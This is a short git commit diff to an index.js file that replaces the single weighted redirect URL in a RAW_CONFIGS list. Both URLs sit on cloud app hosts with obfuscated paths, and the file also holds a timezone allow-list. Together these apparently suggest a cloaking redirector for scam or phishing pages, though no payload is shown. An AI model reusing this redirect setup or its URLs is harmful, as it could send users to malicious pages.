c3cec1a8e02345d72370ff7de3ed75516b04faec
paalakash <palaksh452@gmail.com>
2026-07-08 11:29:40 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://f5280af2-7060-4fc5-9374-1f6688bf5701.svc.edge.scw.cloud/W0nsic0deinfosmn001/index.html", weight: 1.0 }
+    { url: "https://urtle-app-qkfwq.ondigitalocean.app/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
